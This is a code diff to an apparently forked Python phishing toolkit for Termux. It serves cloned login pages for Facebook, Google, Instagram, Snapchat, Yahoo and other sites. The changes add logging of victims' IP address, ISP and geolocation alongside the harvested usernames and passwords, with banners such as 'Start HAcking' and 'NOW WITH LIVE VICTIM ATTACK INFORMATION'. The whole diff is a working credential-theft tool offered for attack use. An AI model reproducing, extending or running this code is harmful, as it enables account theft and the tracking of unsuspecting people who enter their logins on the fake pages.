@@ -57,7 +57,7 @@ def end():
               |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
               |/     / / / / / / /             \_   {1}ME !{2}  _)
                           {1}F I S H{2}                ~--___--~
- {0}This script was made by UndeadSec_ But I have added some more features in it ]
+               {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
 [ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(GREEN, END, CYAN)
 
@@ -65,14 +65,14 @@ def loadModule(module):
        print '''{0}
    _.-=-._     .-, 
  .'       "-.,' / 
-(          _.  < 
+( AnonUD4Y  _.  < 
  `=.____.="  `._\\
 
 
- [{1}*{0}]{1} %s module loaded.{0}'''.format(CYAN, END) % module
+ [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('rm -Rf ServerTermux/www/*.* && touch ServerTermux/www/usernames.txt')
+    system('rm -Rf ServerTermux/www/*.* && touch ServerTermux/www/usernames.txt && touch ServerTermux/www/iplog.txt')
     if option2 == '1' and social == 'Facebook':
         system('cp WebPagesTermux/fb_standard/*.* ServerTermux/www/')
     if option2 == '2' and social == 'Facebook':
@@ -100,7 +100,7 @@ def runPhishing(social, option2):
     elif social == 'Twitter':
         system('cp WebPagesTermux/twitter/*.* ServerTermux/www/')
     elif social == 'Snapchat':
-        system('cp WebPagesTermux/Snapchat_web/*.* Server/www/')
+        system('cp WebPagesTermux/Snapchat_web/*.* ServerTermux/www/')
     elif social == 'Yahoo':
         system('cp WebPagesTermux/yahoo_web/*.* ServerTermux/www/')    	
     elif option2 == '1' and social == 'Instagram':
@@ -109,7 +109,7 @@ def runPhishing(social, option2):
         system('cp WebPagesTermux/Instagram_autoliker/*.* ServerTermux/www/')
         
 def waitCreds():
-    print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
+    print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.... Start HAcking ".format(RED, END) 
   
     print '''{0}
    _.-=-._     .-, 
@@ -117,27 +117,35 @@ def waitCreds():
 (  AnonUD4Y_  ~.< 
  `=.____.="  `._\\ 
  
- [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION  
- [{1}*{0}]{1} JUST GOTO YOUR [ SocialFish/server/www/iplog.txt ]
- [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
+ [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION . 
+ [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, CITY, COUNTRY, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
    
     print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
     while True:
         with open('ServerTermux/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
+            print '================================================='.format(RED, END)
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf ServerTermux/www/usernames.txt && touch ServerTermux/www/usernames.txt')
-	    print ' {0}VICTIM INFORMATION AVAILABLE IN [ server/www/iplog.txt ]{1}\n {0}{1}'.format(RED, END)
-            print ' {0}HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE AVILABLE TO ALL PEOPLE {1}\n {0}{1}'.format(RED, END)	
+            print '================================================='.format(RED, END)
+            print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
+            
+        creds.close()
+        with open('ServerTermux/www/iplog.txt') as creds:
+            lines = creds.read().rstrip()
+        if len(lines) != 0: 
+            print '================================================='.format(RED, END)
+            print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            system('rm -rf ServerTermux/www/iplog.txt && touch ServerTermux/www/iplog.txt')
+            print '================================================='.format(RED, END)
+           
         creds.close()
 
 def runPEnv():
     system('clear')
-    print ''' {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
-                          '
-                        '   '
-                      '       '
+    print '''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
+                       .   .  . 
                  .  '  .        '                        '
              '             '      '                   '   '
   ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██ 
@@ -148,9 +156,8 @@ def runPEnv():
       .    '   '....'               ..'.      ' .
          '  .                     .     '          '     '  {1}v2.0{2} 
                '  .  .  .  .  . '.    .'              '  .
-                   '         '    '. '      {1}Updated_By--> AnonUD4Y_{2}    
-                     '       '      '    
-                      '      '             {1}https://github.com/An0nUD4Y{2}     
+                   '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}    
+                     '        {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]      
                        ' .  '
                            '
                              {1}'''.format(GREEN, END, CYAN)
@@ -171,7 +178,6 @@ def runPEnv():
         print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END)
         exit(0)
     option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
-    
     if option == '1':
         loadModule('Facebook')
         option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Mobile Version(mobile_mode)\n\n {0}[{1}4{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}5{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
